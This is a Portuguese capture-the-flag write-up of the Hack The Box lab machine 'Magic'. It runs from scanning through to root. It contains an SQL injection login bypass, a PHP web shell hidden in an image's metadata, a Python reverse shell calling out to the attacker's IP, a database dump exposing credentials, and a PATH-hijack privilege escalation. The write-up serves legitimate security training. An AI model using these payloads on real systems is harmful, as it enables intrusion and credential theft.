---
title: "Magic"
date: 2020-10-17T22:38:50-03:00
draft: false
---

![HTB](/magic1.png)

nmap -sV -sC -Pn -T4 -v -p- 10.10.10.185

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Magic Portfolio
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

python3 dirsearch.py -u http://10.10.10.185/ -e *

```bash
 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions:  | HTTP method: getSuffixes: CHANGELOG.md | HTTP method: get | Threads: 10 | Wordlist size: 6552 | Request count: 6552

Error Log: /root/dirsearch/logs/errors-20-06-29_23-59-23.log

Target: http://10.10.10.185

Output File: /root/dirsearch/reports/10.10.10.185/20-06-29_23-59-24

[23:59:24] Starting: 
[00:00:12] 301 -  313B  - /images  ->  http://10.10.10.185/images/
[00:00:14] 403 -  277B  - /index.shtml
[00:00:14] 200 -   67KB - /index.php
[00:00:14] 200 -   67KB - /index.php/login/
[00:00:14] 403 -  277B  - /install.sql
[00:00:17] 403 -  277B  - /localhost.sql
[00:00:17] 403 -  277B  - /log.sqlite
[00:00:18] 200 -    4KB - /login.php
[00:00:18] 403 -  277B  - /login.shtml
[00:00:19] 403 -  277B  - /logs.sqlite
```

```
http://10.10.10.185/login.php
```
explorando o site descobri que o nome das imagens pode conter a respectiva senha.

```
http://10.10.10.185/index.php/login/
```
podemos notar hashs + imagens quebradas.
baixei todas as informações da pagina e criei uma wordlist.. vamos ver.
encontrei referências de .sql descobertos pelo dirsearch, portanto tentei fazer uma injeção simples de tabela de usuários.

pesquisei no google:   injection sql login.php

login.php da página que está rodando o brute force (rockyou)

Para minha surpresa deu certo,  no primeiro link. 

https://www.devmedia.com.br/sql-injection-em-ambientes-web/9733

```
' or 1=1 --
```
login/senha

ele já faz o 301 automatico para url  upload

```
http://10.10.10.185/upload.php
```
A ideia é de um envenenamento com uma imagem.  Vou pesquisar uma aplicação que faça isso, no kali deve ter com ctz ...


Depois das pesquisas realizadas, encontrei que existe um programa chamado  *exiftool*
ele grava informações em metadados em varios tipos de arquivos
inclusive  mp3, pdf ,  jpeg etc
Não vem nativo no kali linux, é necessário instalar.

```bash
apt-get install exiftool
```
Utilizei essa wiki para consultar as opções dele e as flags utilizadas >
https://metacpan.org/pod/exiftool

Como o site requer uma imagem,  optei por uma PNG
Ele da suporte de leitura, gravação e escrita
PNG            r/w/c

Posso colocar uma linha de escrita dentro do PNG dessa forma, como no exemplo da wiki >
```html
WRITING EXAMPLES

Note that quotes are necessary around arguments which contain certain special characters such as >, < or any white space. These quoting techniques are shell dependent, but the examples below will work for most Unix shells. With the Windows cmd shell however, double quotes should be used (eg. -Comment="This is a new comment").

exiftool -Comment='This is a new comment' dst.jpg

    Write new comment to a JPG image (replaces any existing comment).
```
Pesquisei no google  *exiftool php shell*

![HTB](/exif2-magic.png)

e vi o vídeo desse cara que está destacado

Ele carrega uma shell para dentro de uma imagem e faz upload no roteador, com isso ganha acesso aos diretorios internos.

Vou tentar fazer a mesma injeção de código.

E encontrar um jeito de utilizar o reverse shell para dentro da maquina.. to vendo exemplos funcionais. 

http://sejalivre.org/OSCP/OSCP_Notes--ReverseShell_(all).html

*Encontrei*
https://github.com/xapax/security/blob/master/bypass_image_upload.md

Esse é o código que vou usar no exiftool:

```bash
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' lo.jpg
```
![HTB](/print1.png)

depois disso renomeio para .php

*mv fxshell.png fxshell.php.png*

continuando .. 

Fiz o upload com sucesso..

estava pesquisando sobre o nc (netcat)  https://www.computerhope.com/unix/nc.htm

com ele podemos ouvir a porta TCP/UDP  no caso aqui,  vou colocar o nc  escutando na porta 1234 uma conexão

https://www.speedguide.net/port.php?port=1234

*nc -nlvp 1234*

```bash
FLAGS:

-n Não faça pesquisas de serviço ou DNS em endereços, nomes de host ou portas especificados.

-l Usado para especificar que o nc deve escutar uma conexão de entrada em vez de iniciar uma conexão com um host remoto. É um erro usar esta opção em conjunto com as opções -p, -s ou -z. Além disso, qualquer tempo limite especificado com a opção -w é ignorado.

-v Faça nc dar uma saída mais detalhada.

-p source_port Especifica a porta de origem que a nc deve usar, sujeita a restrições e disponibilidade de privilégios.
```
![HTB](/print2-magic.png)

agora vou usar aquele famoso shell reverso em python que o professor cansou de falar

http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

```py
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
vamos utilizar este ^

fiz o teste para ver se o upload da imagem deu certo >

http://10.10.10.185/images/uploads/fxshell.php.png

![HTB](/print3-magic.png)

```py
10.10.10.185/images/uploads/fxshell.php.png?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.15",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
o codigo ficará assim, mudando apenas meu IP de tunelamento no script em python

```bash
connect to [10.10.14.247] from (UNKNOWN) [10.10.10.185] 52180
/bin/sh: 0: can't access tty; job control turned off
$ 
```

agora utilizamos o mesmo modulo do python para escalar privilégios

https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/

```py
python3 -c "import pty;pty.spawn('/bin/bash')"
```

Fui procurando alguma informação que me leva-se a escalar privilégios, com o usuário do  www-data e então encontrei dados de usuário no arquivo db.php5

```bash
assets    db.php5  images  index.php  login.php  logout.php  upload.php
www-data@ubuntu:/var/www/Magic$ cat db.php5
cat db.php5
<?php
class Database
{
    private static $dbName = 'Magic' ;
    private static $dbHost = 'localhost' ;
    private static $dbUsername = 'theseus';
    private static $dbUserPassword = 'iamkingtheseus';

    private static $cont  = null;

    public function __construct() {
        die('Init function is not allowed');
    }
```

Com essas informações de usuário, posso baixar os dados do banco.  (dump)


```bash
www-data@ubuntu:/var/www/Magic$ mysqldump --databases Magic -utheseus -piamkingtheseus
<qldump --databases Magic -utheseus -piamkingtheseus
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- MySQL dump 10.13  Distrib 5.7.29, for Linux (x86_64)
--
-- Host: localhost    Database: Magic
-- ------------------------------------------------------
-- Server version    5.7.29-0ubuntu0.18.04.1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;
```

```bash
--
-- Current Database: `Magic`
--

CREATE DATABASE /*!32312 IF NOT EXISTS*/ `Magic` /*!40100 DEFAULT CHARACTER SET latin1 */;

USE `Magic`;

--
-- Table structure for table `login`
--

DROP TABLE IF EXISTS `login`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `login` (
  `id` int(6) NOT NULL AUTO_INCREMENT,
  `username` varchar(50) NOT NULL,
  `password` varchar(100) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `username` (`username`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;
```
```bash
--
-- Dumping data for table `login`
--

LOCK TABLES `login` WRITE;
/*!40000 ALTER TABLE `login` DISABLE KEYS */;
INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
/*!40000 ALTER TABLE `login` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;
```
Quando eu dei um cat no arquivo db.php5 

Eu descobri o usuário de baixo privilegio da maquina e a senha do banco. 

```bash
private static $dbUsername = 'theseus';
private static $dbUserPassword = 'iamkingtheseus';
```

Com esses dados, eu fiz um dump no banco  passando os mesmos :   -u (usuário) -p (senha)   como uma conexão comum via banco
fazendo isso eu descobri a senha do usuário.. 

```
INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
```

```bash
www-data@ubuntu:/var/www/Magic$ su theseus
su theseus
Password: Th3s3usW4sK1ng

theseus@ubuntu:/var/www/Magic$ 
```

só pegar a flag de user

```bash
theseus@ubuntu:/home$ cd theseus
cd theseus
theseus@ubuntu:~$ ls
ls
Desktop    Downloads  Pictures  Templates  Videos
Documents  Music      Public    user.txt
theseus@ubuntu:~$ cat user.txt    
```
Para pegar o root,  tem um truque do  Sysinfo  que pode ser encontrado na internet.

```bash
theseus@ubuntu:~$ sysinfo
```

quando rodar esse comando, automaticamente ele trará informações do sistema
por que se trata de um binário.

```bash
====================Hardware Info====================
H/W path           Device      Class      Description
=====================================================
                               system     VMware Virtual Platform
/0                             bus        440BX Desktop Reference Platform
/0/0                           memory     86KiB BIOS
/0/1                           processor  AMD EPYC 7401P 24-Core Processor
/0/1/0                         memory     16KiB L1 cache
/0/1/1                         memory     16KiB L1 cache
/0/100/17.5                    bridge     PCI Express Root Port
/0/100/17.6                    bridge     PCI Express Root Port
/0/100/17.7                    bridge     PCI Express Root Port
/0/100/18                      bridge     PCI Express Root Port
/0/100/18.1                    bridge     PCI Express Root Port
/0/100/18.2                    bridge     PCI Express Root Port
/0/100/18.3                    bridge     PCI Express Root Port
/0/100/18.4                    bridge     PCI Express Root Port
/0/100/18.5                    bridge     PCI Express Root Port
/0/100/18.6                    bridge     PCI Express Root Port
/0/100/18.7                    bridge     PCI Express Root Port
/0/46              scsi0       storage    
/0/46/0.0.0        /dev/cdrom  disk       VMware IDE CDR00
/1                             system     
```

Dentro do tmp,  criei uma pasta root e dentro dela criei o arquivo  fdisk  por que o fdisk é um dos modulos que o binário chama. 

```bash
theseus@ubuntu:/tmp/root$ touch fdisk
```

Depois exporto o path, para ser executado com a váriavel $PATH
```bash
theseus@ubuntu:/tmp/root$ export PATH=/tmp/root:$PATH
```
Agora neste arquivo do fdisk vou jogar aquele shell reverso em python novamente

```bash
theseus@ubuntu:/tmp/root$ cat > fdisk
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.15",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Agora sim dou as permissões 

chmod 755 fdisk

OBS >  no shell reverso coloco meu IP de tunel e porta

agora abro um novo terminal

E uso no netcat novamente para escutar na porta 1234 

```bash
kali@kali:nc -nlvp 1234
```
volto na outra aba do terminal

e executo o path

```bash
theseus@ubuntu: sysinfo
```
Na outra aba com o netcat ouvindo, vc vai perceber que o binário foi executado elevando seu privilégio para root

```bash
Ncat: Connection from 10.10.10.185:45410.
root@ubuntu:/tmp/root# whoami
whoami
root
```





























